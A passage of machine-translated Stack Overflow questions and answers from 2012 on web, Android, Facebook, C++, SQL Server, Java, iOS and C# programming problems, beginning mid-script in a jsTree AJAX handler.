                $.ajax({
                    async: false,
                    type: 'POST',
                    url: "./js/jsTree/server.php?user_id=jeanpaul&cat=t",
                    data: {
                        "operation": "rename_node",
                        "id": this.id.replace("node_", ""),
                        "label": data.rslt.new_name
                    },
                    success: function (r) {
                        if (!r.status) {
                            data.inst.refresh();
                        }
                    }
                });
            });
        })

        .bind("move_node.jstree", function (e, data) {
            data.rslt.o.each(function (i) {
                $.ajax({
                    async: false,
                    type: 'POST',
                    url: "./js/jsTree/server.php?user_id=jeanpaul&cat=t",
                    data: {
                        "operation": "move_node",
                        "id": $(this).attr("id").replace("node_", ""),
                        "ref": data.rslt.cr === -1 ? 1 : data.rslt.np.attr("id").replace("node_", ""),
                        "position": data.rslt.cp + i,
                        "label": data.rslt.name,
                        "copy": data.rslt.cy ? 1 : 0
                    },
                    success: function (r) {
                        if (!r.status) {
                            $.jstree.rollback(data.rlbk);
                        } else {
                            $(data.rslt.oc).attr("id", "node_" + r.id);
                            if (data.rslt.cy && $(data.rslt.oc).children("UL").length) {
                                data.inst.refresh(data.inst._get_parent(data.rslt.oc));
                            }
                        }
                    }
                });
            });
        });

    });
</script>
<script type="text/javascript">
    // Code for the menu buttons of Tasks
    jQuery.noConflict();
    jQuery(function ($) {

        $("#menu_t img").css('cursor', 'pointer').click(function () {

            switch (this.id) {

            case "create":
                $.jstree._reference("#t").get_checked(-1, true).each(function (index, element) {
                    $("#t").jstree("create", '#' + $(element).attr("id"), "last", null, false);
                });
                break;

            case "remove":
                $.jstree._reference("#t").get_checked(-1, true).each(function (index, element) {
                    $("#t").jstree("remove", '#' + $(element).attr("id"));

                    // only refresh if we are taking the first node displayed... it's going to recreate it in the backend.
                    if ($(element).attr("id") == $("div.jstree > ul > li").first().attr("id")) {
                        $.jstree._reference($("#t")).refresh(-1);
                    }

                });
                break;

            case "rename":

                $.jstree._reference("#t").get_checked(-1, true).each(function (index, element) {
                    $("#t").jstree("rename", '#' + $(element).attr("id"), true);
                });

                break;

            case "cut":
                $.jstree._reference("#t").get_checked(-1, true).each(function (index, element) {

                    $("#t").jstree("cut", '#' + $(element).attr("id"));
                });
                break;

            case "copy":

                $.jstree._reference("#t").get_checked(-1, true).each(function (index, element) {

                    $("#t").jstree("copy", '#' + $(element).attr("id"));
                });
                break;

            case "paste":

                $.jstree._reference("#t").get_checked(-1, true).each(function (index, element) {

                    $("#t").jstree("paste", '#' + $(element).attr("id"));
                });
                break;

            }
        });
    });
</script> 
```

# php - 基于 PHP 的可打印版本

> ID：10862152
> 
> 赞同：3
> 
> 时间：2012-06-02T12:00:38.867
> 
> 标签：php, css

我有一个包含数百篇文章的手工编码网站。我当前的主题是蓝色背景。当然，图像因此具有蓝色背景。为了将来对可打印版本的支持，我（从第一天开始）保留了两个版本的图像，后一个版本具有白色背景。这些扩展名之前有“_print”。

当然，创建可打印版本的最佳方法是使用不同的 CSS，并在各自的 CSS 中通过“display:none”隐藏标题和侧边栏。

有什么方法可以使用 PHP 在可打印版本的“.jpg”之前自动添加“_print”？或者还有其他方法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T12:11:07.607

您可以使用 PHP 或 Javascript 来执行此操作。

在 PHP 中，您可以只传递一个类似 ?print=true 的参数，然后编写一个小辅助函数来获取适当的图像 url。

```
<?php
function getImageUrl(imageUrl) { 
   if(isset($_GET["print"])) {
      return preg_replace('\.jpg$','_print\.jpg',imageUrl);
   }
   return imageUrl;
}
?> 
```

免责声明 - 不是 PHP 开发人员。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-02T12:12:50.817

如果 php 脚本在构建网站时使用图像的全名，为什么不呢？

如果我希望你的代码是这样的，你应该创建这样的东西：

```
echo '<img src="images/artcle_'.$aid.',jpg"/>'; 
```

您应该通过 $_GET 或 $_POST 添加一个新变量，例如：

```
$print = "";

if($_GET['print'] == "1"){
     $print = "_print";
} 
```

然后：

```
echo '<img src="images/artcle_'.$aid.$print.',jpg"/>'; 
```

导致仅在发送 Print 参数时才显示打印版本。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-02T12:12:17.887

```
<? php if ($print_page == true)
{
    $append = "_print";
}
else
{
    $append = "";
} ?>

<html>
  <body>
     <img src = "/image/image<?php echo $append?>.jpg />
  </body>
</html> 
```

通过在所有图像链接中包含 $append - 如果需要，它们将使用 _print 自动更新。如果您希望页面可打印，只需根据需要将 $print_page 设置为 true 或 false

# java - 如何将资源文件夹中的图像加载到android listview中

> ID：10862153
> 
> 赞同：1
> 
> 时间：2012-06-02T12:00:46.163
> 
> 标签：java, android, android-listview

我在资源文件夹中有 200 张图像，我将它们命名为`name_1.png`, `name_2.png`。我有一个数组，其中我有几个数字，例如`2, 4 , 6 ,30 , 40 ... and so on`.

我想将图像和文本视图加载到 android`listview`并根据资源文件夹中的数字显示图像。

为此，我创建了一个`activity class`和`image adapter class`for `custom list view`。

我可以`text view`根据数组数据编号显示数据但不能显示图像。

任何人都可以建议我如何做到这一点。我在想我必须在`getview`方法中编写代码来更改图像。

这是`getview`我尝试过的方法

```
@Override
public View getView(int position, View convertView, ViewGroup parent) {
    convertView = mInflater.inflate(mViewResourceId, null);

    TextView tv1 = (TextView)convertView.findViewById(R.id.tvtype);
    TextView tv2 = (TextView)convertView.findViewById(R.id.tvnumber);
    ImageView i1= (ImageView)convertView.findViewById(R.id.ivlfirst);
    //int i = Integer.parseInt("normal_"+mStrings.get(position)+".png");

i1.setBackgroundResource("normal_"+mStrings.get(position)+".png");
    tv1.setText(mStrings1.get(position));
    tv2.setText(mStrings.get(position));
    return convertView;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-03T13:57:07.747

取一个`Integer array`并`R.drawable.imageView1......200`传递它的值 Like

```
 private Integer[] Imgid = {R.drawable.imageview1,....,200  };
    i1.setBackgroundResource(Imgid[j]); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T12:06:15.467

当您的图像位于 res 文件夹中时，您不能轻易做到这一点，因为每个资源都由一个 int id 访问。

您应该考虑将图像放入您可以像常规文件系统一样访问的资产文件夹中。看看资产管理器。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T14:45:24.613

如果要根据名称使用可绘制文件夹中的图像（从资源名称获取资源 id），请使用**public int [getIdentifier](http://developer.android.com/reference/android/content/res/Resources.html#getIdentifier%28java.lang.String,%20java.lang.String,%20java.lang.String%29) (String name, String defType, String defPackage)**，它返回给定资源名称的资源标识符，例如：

```
 int image = getResources().getIdentifier(image_name, "drawable",getPackageName());
 ImageView i1= (ImageView)convertView.findViewById(R.id.ivlfirst);
 i1.setBackgroundResource(image); 
```

* * *

对于您的特定情况，您可以使用：

```
i1.setBackgroundResource(getResources().getIdentifier("normal_"+mStrings.get(position), "drawable",getPackageName())); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-02T12:14:16.870

如果您想从以下位置获取图像，请尝试此操作`assets`：

```
InputStream is = ctx.getAssets().open("normal_"+mStrings.get(position)+".png");
Drawable d = Drawable.createFromStream(is, "resourceName");
i1.setBackgroundDrawable(d); //i1 is your imageView 
```

希望能帮助到你 ！！

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-02T12:37:26.097

这很简单，只需在**getView()**方法中执行以下操作

```
 String yourimagename="normal_"+ mStrings.get(position);   // In this no need of image extension like .png,.jpg etc

 int  resImgId= YourActivityName.this.getResources().getIdentifier("Your Package Name:drawable/" +yourimagename, null, null); 
```

或试试这个

```
 int  resImgId= YourActivityName.this.getResources().getIdentifier("Your Package Name:drawable/" +yourimagename, null, null); 
```

或试试这个

```
 int  resImgId= context.getResources().getIdentifier("Your Package Name:drawable/" +yourimagename, null, null); 
 i1.setImageResource(resImgId); 
```

# facebook - 选项卡应用程序不会弹出用户权限对话框

> ID：10862155
> 
> 赞同：0
> 
> 时间：2012-06-02T12:01:30.760
> 
> 标签：facebook, tabs, user-permissions

我已经实现的应用程序有一个奇怪的行为，它在访问时捕获用户的信息。如果从 Facebook URL 外部访问该应用程序，则会正确弹出一个 JavaScript 权限对话框。但是，当我将此应用程序作为选项卡应用程序插入 Facebook 页面时，权限请求对话框不再弹出。此外，我还在 FB.getLoginStatus() 实现中放置了检测用户在 Facebook 中的当前登录状态，如果用户未登录，则会弹出一个 JavaScript 警报弹出窗口。当从“外部”调用应用程序时警报被触发。当应用程序位于 Facebook 页面选项卡上时，它不会。这是正确的行为吗？如果是这样，我如何在 Facebook 选项卡应用程序中启用权限请求。一世'

编辑 1（在 CBroe 评论之后）：我在应用程序的 content.php 标记中使用以下调用（在页面加载时执行）：

```
<!-- Facebook JS SDK initialization -->
  <div id="fb-root"></div>
  <script>initFacebookJSSDK();</script>
<!-- End of Facebook JS initialization -->
<script>checkAccessPermission();</script>
<?php include_once 'sites/www.mysite.com/custom_code/custom_index.php';?> // I'm doing  
custom code under Drupal 
```

JavaScript 函数在 custom.js 文件中实现，如下所示：

```
function initFacebookJSSDK()    {
window.fbAsyncInit = function() {
    FB.init({
      appId      : 'xxxxxxxxxxxxxxxxxx', // Application's ID
      channelUrl : 'www.appsite.com/channel.html', // Channel File
      status     : true, // check login status
      cookie     : true, // enable cookies to allow the server to access the session
      xfbml      : true,  // parse XFBML
      oauth      : true // enable OAuth
    });
.........
    });
.........
}
function getPerms() {
    FB.login(function(response) {
        if (!response.authResponse) {
            //user refused to grant permissions, redirect to the 'index' page
        window.location = "/index";
        }
    }, {scope:"email"}); // I request the permission to get the email address
}
function checkAccessPermission()    {
FB.getLoginStatus(function(response) {
    if (response.status === 'connected') {
          //user has granted permissions to the application
      var uid = response.authResponse.userID; // not used
          var accessToken = response.authResponse.accessToken; // not used
    }
    else if (response.status === 'not_authorized')
        // user is logged into Facebook but didn't grand permissions to the app
          getPerms();
    else {
        //user has not granted permissions, redirect to the 'index' page
    alert('Please connect with your Facebook account');
    window.location = "/index";
      }
 });
} 
```

PHP 脚本 - 文件“custom_index.php”包含以下片段：

```
$config = array();
$config["appId"] = FB_APP_ID;
$config["secret"] = FB_SECRET_ID;
$config["cookie"] = true;
$facebook = new Facebook($config);
// get user UID
$fb_user_id = $facebook->getUser();
// user's first visit, force the permission request window
if ($fb_user_id == 0)  {
    $location = $facebook->getLoginUrl(array('scope' => 'email'));
    ..........
}
// user already gave permission, get the profile and process
if ($fb_user_id != 0)  {
    $access_token = $facebook->getAccessToken();
    $user_profile = $facebook->api('/me', array('access_token'=>$access_token));
    ..........
} 
```

同样，当用户访问 Facebook 之外的站点时，它工作得很好，但是当它作为 Facebook 选项卡应用程序（Facebook 内的框架）运行时，权限请求弹出窗口不显示。需要注意的是，关于我之前的帖子，现在是 JavaScript 声明：

```
alert('Please connect with your Facebook account'); 
```

在这两种情况下都会执行，包括当应用程序在 Facebook 内作为选项卡应用程序运行时（我只需要清除浏览器的缓存）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-06T17:04:48.097

这是解决方案。上面的所有代码都是正确的并且保持不变。我刚刚在拉出'content.php'页面的链接上添加了一个jQuery函数，如下（'.open-content-page'类在'content.php'的父页面上）：

```
$(document).ready(function () {
            $(".open-content-page").click(function()    {
            checkAccessPermission();
            });
});
})(jQuery); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T19:59:02.827

你在没有任何用户交互的情况下调用你的 JS 函数——你确定不只是浏览器的弹出窗口阻止程序阻止对话框出现吗？（也许它可以区分从“简单”页面调用的弹出窗口与来自嵌入在其他域的 iframe 中的页面的弹出窗口。）

由于您不能依赖您网站的用户将*他们的*弹出窗口阻止程序设置得非常自由，因此在用户交互时调用 facebook 对话框通常是一个更好的主意，例如当用户单击链接/按钮时。与想要自行打开的弹出窗口相比，调用用户交互的弹出窗口不太可能被阻止。

# c++ - 在没有 VS11 Beta 的电脑上运行基于 VS11 Beta 开发的 App

> ID：10862156
> 
> 赞同：1
> 
> 时间：2012-06-02T12:01:40.587
> 
> 标签：c++, visual-studio, visual-c++, visual-studio-2012, visual-c++-2012

我使用 Visual Studio 11 Beta 开发了一个应用程序。该应用程序无法在未安装 VS 11 Beta 的计算机上运行...

我已经安装了 .NET Framework 4.5，但它没有帮助......

有没有人对我应该安装或添加文件有什么建议，以便让它在没有 VS11 的任何计算机上工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T13:01:44.863

当您在使用 Visual Studio 创建新的 C++ 应用程序时创建新项目时，此项目默认将[**运行时库**](http://msdn.microsoft.com/en-us/library/2kzt1wy3%28v=vs.71%29.aspx)选项设置为**/MD**用于发布配置或**/MDd**用于调试。*“使用此选项编译的应用程序静态链接到 MSVCRT.lib。此库提供了一层代码，允许链接器解析外部引用。实际工作代码包含在 MSVCR* * *.DLL 中，它必须在运行时可用以与 MSVCRT.lib 链接的应用程序。”*

您需要做的是转到项目设置，**配置属性 -> C/C++ -> 代码生成**并将**运行时库**更改为**多线程 (/MT)**用于发布/**多线程调试 (/MTd)**用于调试。这将导致运行时库被静态链接，并且您的应用程序不会尝试在运行时加载该 DLL。

检查运行时依赖关系的好方法是使用**[Dependency Walker](http://www.dependencywalker.com/)**：
构建应用程序并将应用程序 (.exe) 拖放到其中，它会显示它的依赖关系，您现在可能会在其中看到**MSVCR110.DLL**。当您将运行时库的使用更改为 /MT 时，重新构建您的应用程序并检查此依赖项是否真的消失了 :)

# php - TinyMCE 的 PDW 文件浏览器 - 上传路径

> ID：10862157
> 
> 赞同：1
> 
> 时间：2012-06-02T12:01:45.207
> 
> 标签：php, javascript, jquery, file-upload, tinymce

我将 PDW 文件浏览器（TinyMCE 插件）集成到 TinyMCE 编辑器中。但是当我单击“插入/编辑图像按钮 >>> 常规选项卡 >>> 浏览按钮（在图像 URL 字段旁边）”时，我收到了以下错误消息：

```
"Upload folder doesn't exist or $uploadpath in config.php is set wrong!" 
```

我确定我已经正确设置了所有内容。我已经设置了“上传路径”：

```
$uploadpath = "/en/images/"; 
```

并尝试使用以下“define()”方法之一（在“config.php”，第 122 - 126 行），正如插件创建者所建议的那样：

```
//define('DOCUMENTROOT', '/home/httpd/httpdocs');

//define('DOCUMENTROOT', 'c:\\webroot\\example.com\\www');

//define('DOCUMENTROOT', $_SERVER['DOCUMENT_ROOT']);

//define('DOCUMENTROOT', realpath((@$_SERVER['DOCUMENT_ROOT'] && file_exists(@$_SERVER['DOCUMENT_ROOT'].$_SERVER['PHP_SELF'])) ? $_SERVER['DOCUMENT_ROOT'] : str_replace(dirname(@$_SERVER['PHP_SELF']), '', str_replace(DIRECTORY_SEPARATOR, '/', realpath('.')))));

define('DOCUMENTROOT', realpath((getenv('DOCUMENT_ROOT') && preg_match('#^'.preg_quote(realpath(getenv('DOCUMENT_ROOT'))).'#', realpath(__FILE__))) ? getenv('DOCUMENT_ROOT') : str_replace(dirname(@$_SERVER['PHP_SELF']), '', str_replace(DIRECTORY_SEPARATOR, '/', dirname(__FILE__))))); 
```

它们都不起作用。有没有人遇到过同样的问题？如何解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-26T14:46:50.250

此处定义的 DOCUMENTROOT 将仅指向 www 或 htdocs 目录。因此，如果您有托管网站文件的子文件夹（在本地测试时发生）；也将其添加到 $uploadpath。

将您的代码更改为

```
$uploadPath = "/mywebsite/en/images/"; 
```

其中 mywebsite 代表您的网站目录。

# jquery - 使用 JS 变量时遇到问题

> ID：10862159
> 
> 赞同：1
> 
> 时间：2012-06-02T12:02:08.543
> 
> 标签：jquery, variables, global-variables

我有以下代码：

```
$("#get_details").click(function(){ 
  name = $("#user_name").val();
  var age,gender;
  $.post("users.php", { name: name },
    function(data){
      if (data.status == 'success'){
        age = data.message[0];
        gender = data.message[1];
        alert(age); //getting output
      }
    }, "json");

   alert(age);//doesn't getting output
 }); 
```

我想在外部访问这些值`$.post()`，为此我需要修改什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T12:05:06.433

首先，`var`在本地范围内定义它们。如果没有`var`它们，则可以从`window`全局对象（如`window.age`或`window.gender`）访问它们。

但是您的第二个警报不起作用，因为当它被调用时，它还`$.post`没有完成，因为它是异步的。你可以这样做：

```
$("#get_details").click(function(){

    var name = $("#user_name").val();
    var age,gender;
    var json_ready = false;

    $.post("users.php", { name: name },function(data){
        json_ready = true;
        if (!data.status == 'success') return;

        age = data.message[0];
        gender = data.message[1];
    }, "json");

    var json_alert = function(){
        if(!json_ready)  return setTimeout(function(){ json_alert(); },1000);
        alert('gender: '+gender+', age: '+age);
    }

    json_alert();

}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T12:09:44.057

$.post() 是异步的，所以第二个 alert() 在你得到 age 的值之前被调用。

要使其工作，您必须使用允许同步发布的 $.ajax() 。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T12:10:11.673

年龄获取 $.post 回调的值。并且此回调的响应会消耗时间。javascript 不等待 $.post 的响应并立即运行警报（年龄）。

# java - Java - 添加返回语句

> ID：10862163
> 
> 赞同：-5
> 
> 时间：2012-06-02T12:02:58.943
> 
> 标签：java, return

我正在学习java，所以如果它看起来很基础，请耐心等待。我有一个方法，我试图编辑它以返回一个“读入”的值 - 我试图返回“移动”。但是，由于代码的设置，返回超出了代码块并迫使我返回 null。有人可以编辑代码以使其返回“移动”值吗？我已经为此工作了 2 天，但我无法解决 - 尝试和捕获似乎导致了问题

```
public Move listenToEngineMove()
{
  synchronized(engineReadBuffer)
  {
    int numRows=engineReadBuffer.size();

    if(numRows==0);

    for(int kk=0; kk<numRows; kk++)
    {
      String row=engineReadBuffer.get(kk);

      row=row.toLowerCase();

      if((row.contains("move "))||(row.contains(" ... ")))
        if((!row.contains("illegal"))&&(!row.contains("error")))
          try { 
            String[] tokens=row.replaceAll("\\<.*\\>"," ").split("\\s+");
            Move move = new Move(tokens[tokens.length-1]);
            jcb.makeAIsMove(move);

            System.out.println("thread.... " + row);
          }  
          catch (Exception x) {
            System.out.println("Exception! : "+x.getMessage());
          } 
    }

    engineReadBuffer.clear();
  }
  return null;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-02T12:07:37.033

尝试这个：

```
public Move listenToEngineMove() {
    Move move = null;
    synchronized (engineReadBuffer) {
        int numRows = engineReadBuffer.size();
        if (numRows == 0) ;   // what on earth is this?
        for (int kk = 0; kk < numRows; kk++) {
            String row = engineReadBuffer.get(kk);
            row = row.toLowerCase();
            if ((row.contains("move ")) || (row.contains(" ... ")))
                if ((!row.contains("illegal")) && (!row.contains("error")))
                    try {
                        String[] tokens = row.replaceAll("\\<.*\\>", " ").split("\\s+");
                        move = new Move(tokens[tokens.length - 1]);
                        jcb.makeAIsMove(move);

                        System.out.println("thread.... " + row);
                    } catch (Exception x) {
                        System.out.println("Exception! : " + x.getMessage());
                    }
        }
        engineReadBuffer.clear();
    }
    return move;
} 
```

我建议你更换这个：

```
catch(Exception x){System.out.println("Exception! : "+x.getMessage());} 
```

有了这个：

```
catch(Exception e){
   e.printStackTrace();   // Or, better yet, logging with Log4J
} 
```

完整的堆栈跟踪提供了比消息更多的信息。

这条线对我来说似乎是一个错误。最后的分号看起来不合适。

```
if (numRows == 0) ;   // what on earth is this? 
```

你的代码看起来很糟糕。我觉得很难阅读，因为您与缩进和一般代码样式不一致。风格很重要；它使您的代码更易于阅读和理解。采用更好的风格并坚持下去。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-02T12:12:54.297

您需要**在同步块内移动“移动”，**将其保持在同步块内以保持线程安全很重要。

```
public Move listenToEngineMove()
{
synchronized(engineReadBuffer)
  {
      Move move =null;

      int numRows=engineReadBuffer.size();
      if(numRows==0);

   for(int kk=0; kk<numRows; kk++)
     {
     String row=engineReadBuffer.get(kk);
     row=row.toLowerCase();

     if((row.contains("move "))||(row.contains(" ... ")))
      if((!row.contains("illegal"))&&(!row.contains("error")))
       try { 
        String[] tokens=row.replaceAll("\\<.*\\>"," ").split("\\s+");
        move = new Move(tokens[tokens.length-1]);

             System.out.println("thread.... " + row);
            }  
       catch(Exception x){System.out.println("Exception! : "+x.getMessage());} 
     }  
   engineReadBuffer.clear();
   return move;//this is inside synchronized block
  }
} 
```

# iphone - Iphone 使用 smtp 服务器向多个收件人发送电子邮件？

> ID：10862164
> 
> 赞同：0
> 
> 时间：2012-06-02T12:03:11.370
> 
> 标签：iphone, objective-c, ios, xcode4

在我的应用程序中，我想向多个收件人发送电子邮件。我能够一次向一个人发送电子邮件，现在我想向多个收件人发送电子邮件。

我有一个 nsmutable 数组 *sNamesArr ，其中包含收件人的数据。NSMutableArray *sNamesArr;

以下是m代码：

```
-(void)sendEMAIL
{
    NSLog(@"Paused state100");
    [dictUser retain];

    //Auto code

    SKPSMTPMessage *testMsg = [[SKPSMTPMessage alloc] init];

    //testMsg.fromEmail = @"Lexi mobile";//nimit51parekh@gmail.com

    testMsg.fromEmail = str_uname;
    NSLog(@"str_Uname=%@",testMsg.fromEmail);

//    str_info = [str_info stringByReplacingOccurrencesOfString:@"," withString:@""];
//    testMsg.toEmail = str_info;
//    NSLog(@"autoemail=%@",testMsg.toEmail);

    //str_info = [str_info stringByReplacingOccurrencesOfString:@"," withString:@""];

    testMsg.toEmail = str_info;
    NSLog(@"autoemail=%@",testMsg.toEmail);

    testMsg.relayHost = @"smtp.gmail.com";

    testMsg.requiresAuth = YES;

    testMsg.login = str_uname;
    NSLog(@"autoelogin=%@",testMsg.login);

    testMsg.pass = str_password;
    NSLog(@"autopass=%@",testMsg.pass);

    testMsg.subject = @"Schedule Sms And Email";

    testMsg.wantsSecure = YES; 

    NSString *sendmsg=[[NSString alloc]initWithFormat:@"%@",str_info2];
    NSLog(@"automsg=%@",sendmsg);

    testMsg.delegate = self;

    NSDictionary *plainPart = [NSDictionary dictionaryWithObjectsAndKeys:@"text/plain",kSKPSMTPPartContentTypeKey,

                               sendmsg,kSKPSMTPPartMessageKey,@"8bit",kSKPSMTPPartContentTransferEncodingKey,nil];

    testMsg.parts = [NSArray arrayWithObjects:plainPart,nil];

    [testMsg send];

   // [self DeleteRowAfterSending];
    [self performSelector:@selector(DeleteRowAfterSending) withObject:nil afterDelay:5.0];
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T12:14:51.513

似乎 SKPSMTPMessage 类仅限于一次发送到一个地址。因此，您似乎有三个选择：

1.  下载 SKPSMTPMessage 代码并修改它以支持 TO 地址列表。
2.  编写您自己的 SMTP 客户端库以发送给多个收件人。如果您知道您的消息将不包含附件并且具有可预测的内容，那么编写 SMTP 套接字客户端的任务将会更容易。
3.  如果您的应用程序已经在与您控制的服务进行通信，请添加一个服务端点来发送电子邮件，手机会在其中发送内容和收件人，并且该服务会执行所有 SMTP 工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-11-13T13:41:06.927

SKPSMTPMessage 一次性发送到 SMTP 地址，并且必须一个一个发送。

这个链接对你真的很有帮助。

[使用 SKPSMTPMessage 向多个收件人发送电子邮件？](https://stackoverflow.com/questions/5799112/send-email-to-multiple-recipients-with-skpsmtpmessage)

# sql-server - 如何创建数据库行的文本文件？

> ID：10862166
> 
> 赞同：0
> 
> 时间：2012-06-02T12:03:35.620
> 
> 标签：sql-server, database, sql-function

我有一个数据库表，其中有一个名为 的列`File Content`和许多行。我需要的是为每一行的`File Content`列创建一个文本文件。

**例子：**

```
Sr.        File Name        File Content

1\.         FN1              Hello
2\.         FN2              Good Morning
3\.         FN3              How are you?
4\.         FN4              Where are you? 
```

假设我有 4 行，那么应该创建 4 个文本文件（可能是我们想要的任何名称）

1.  `File1.txt`应该有文本“你好”。
2.  `File2.txt`应该有文本“早安”。
3.  `File3.txt`应该有文字“你好吗？” 在里面。
4.  `File4.txt`应该有文字“你在哪里？” 在里面

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T13:40:59.473

这可以通过 SQL 服务器的 BCP OUT 语法来完成。

对于设置：只需确保您在服务器上具有 xp_cmdshell 执行权限。这可以从 master.sys.configurations 表中检查。还要更改与您的服务器或网络共享相对应的文件位置路径。我检查并能够生成 4 个文件，因为表中有 4 条记录。

```
use master
go

declare @DSQL Nvarchar(max)
declare @counter int
declare @maxrows int
declare @filename Nvarchar(30)

select @counter=1, @maxrows = 0

create table t1 (
 sno int identity(1,1) not null,
 filename varchar(5),
 filecontent varchar(100)
)

insert into t1
select 'FN1', 'Hello'
UNION
select 'FN2', 'Good Morning'
UNION
select 'FN3', 'How are you?'
UNION
select 'FN14', 'Where are you?'

select @maxrows = count(*) from t1

--SELECT * FROM T1

while (@counter <= @maxrows)
begin
  select @filename = filename from t1
   where sno = @counter
select @DSQL = N'exec xp_cmdshell' + ' ''bcp "select filecontent from master.dbo.T1 where sno = ' + cast(@counter as nvarchar(10)) + '" queryout "d:\temp\' + @filename + '.txt" -T -c -S home-e93994b54f'''

print @dsql
exec sp_executesql @DSQL
   select @counter = @counter + 1
end

drop table t1 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-02T14:16:57.260

虽然你说你说你需要在 TSQL 中这样做，但如果可能的话，我不会那样做。Ram 向您展示了一种解决方案，但它的缺点是您需要使用 xp_cmdshell 并且 SQL Server 服务帐户需要在您想要拥有文件的任何位置访问文件系统的权限。

My suggestion would be to write a script or small program in your preferred language (PowerShell, Perl, Python, C#, whatever) and use that instead. TSQL as a language is simply badly suited for manipulating files or handling anything outside the database. It is obviously possible (CLR procedures are another way), but you often run into problems with permissions, encodings and other issues that are much easier to deal with in an external language.

# c# - 将 byte[] 或对象转换为 GUID

> ID：10862171
> 
> 赞同：24
> 
> 时间：2012-06-02T12:04:27.663
> 
> 标签：c#, active-directory, guid

我为对象数据类型分配了一些值，例如，

```
object objData =dc.GetDirectoryEntry().Properties["objectGUID"].Value; 
```

这个对象重新调整值，如`{byte[16]} [0]: 145 [1]: 104 [2]: 117 [3]: 139 [4]: 124 [5]: 15 [6]: 255 [7]: 68 [8]: 142 [9]: 159 [10]: 208 [11]: 102 [12]: 148 [13]: 157 [14]: 179 [15]: 75`

然后我将此对象转换为字节 []，例如

```
byte[] binaryData = objData as byte[]; 
```

它也会像这样返回， `{byte[16]} [0]: 145 [1]: 104 [2]: 117 [3]: 139 [4]: 124 [5]: 15 [6]: 255 [7]: 68 [8]: 142 [9]: 159 [10]: 208 [11]: 102 [12]: 148 [13]: 157 [14]: 179 [15]: 75`

然后我从 byte[] 转换十六进制值，例如，

```
string strHex = BitConverter.ToString(binaryData); 
```

它会像`**91-68-75-8B-7C-0F-FF-44-8E-9F-D0-66-94-9D-B3-4B**`..一样返回。但是我需要像 GUID 格式这样的输出，我该如何实现呢？

* * *

## 回答 #1

> 赞同：73
> 
> 时间：2012-06-02T12:05:51.040

使用[`Guid`带有字节数组的构造函数](http://msdn.microsoft.com/en-us/library/90ck37x3.aspx#Y0)怎么样？

```
Guid guid = new Guid(binaryData); 
```

（如果需要，您可以使用`Guid.ToString()`以文本形式获取它。）

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-09-25T14:20:38.860

```
byte[] binaryData = objData as byte[];
string strHex = BitConverter.ToString(binaryData);
Guid id = new Guid(strHex.Replace("-", "")) 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-03-28T17:00:26.263

长格式将是（[在此处输入链接描述](http://www.codeproject.com/Articles/18102/Howto-Almost-Everything-In-Active-Directory-via-C#29)）：

```
public static string ConvertGuidToOctectString(string objectGuid)
{
    System.Guid guid = new Guid(objectGuid);
    byte[] byteGuid = guid.ToByteArray();
    string queryGuid = "";
    foreach (byte b in byteGuid)
    {
        queryGuid += @"\" + b.ToString("x2");
    }
    return queryGuid;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-14T19:45:38.677

该类`System.DirectoryServices.DirectoryEntry`具有`Guid`用于此目的的属性 - 无需通过 访问 objectGUID 属性`Properties`。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-08-20T13:10:43.123

尽管上面建议的手动转换有效，但有一种方法可以自动执行此操作。

1.  您可以使用官方 SQLite 提供程序，而不是 Microsoft 提供的。使用它`SQLiteConnectionStringBuilder`来配置一个将您的 Guids 理解为 Guids 的连接：

```
var builder = new SQLiteConnectionStringBuilder("Data Source=./mydatabase.db") { BinaryGUID = true };
var connStr = builder.ToString();
return new SQLiteConnection(connStr); 
```

这是官方的 SQLite 提供程序：[https ://www.nuget.org/packages/System.Data.SQLite.Core/](https://www.nuget.org/packages/System.Data.SQLite.Core/)

2.  如果使用 Dapper，您可以使用此类自动将字节数组转换为 Guid，该类应在您的应用程序启动后立即注册一次：

```
public class GuidTypeHandler : SqlMapper.TypeHandler<Guid>
{
    public override Guid Parse(object value)
    {
        var valueAsBytes = (byte[])value;
        return new Guid(valueAsBytes);
    }

    public override void SetValue(System.Data.IDbDataParameter parameter, Guid value)
    {
        var guidAsBytes = value.ToByteArray();
        parameter.Value = guidAsBytes;
    }
}

// And the registration in Startup.cs or equivalent:
SqlMapper.AddTypeHandler<Guid>(new GuidTypeHandler()); 
```

来源：[Dapper 问题 #718 - GitHub](https://github.com/StackExchange/Dapper/issues/718)

# jquery - 获取对调用 slides() 的元素的引用

> ID：10862178
> 
> 赞同：0
> 
> 时间：2012-06-02T12:05:00.557
> 
> 标签：jquery, slidesjs

有没有办法获得对调用的元素的引用`slides()`？

示例代码：

```
$('#my_slideshow').slides({
  animationStart: function() {
    <reference_to_myslideshow>.something();
  }
}); 
```

使用`$(this)`返回创建的幻灯片对象，它是这样的：

```
[
Object
animationComplete: function (current) {
animationStart: function () {
autoHeight: false
autoHeightSpeed: 350
bigTarget: false
container: "slides_container"
crossfade: "true"
currentClass: "current"
effect: "fade"
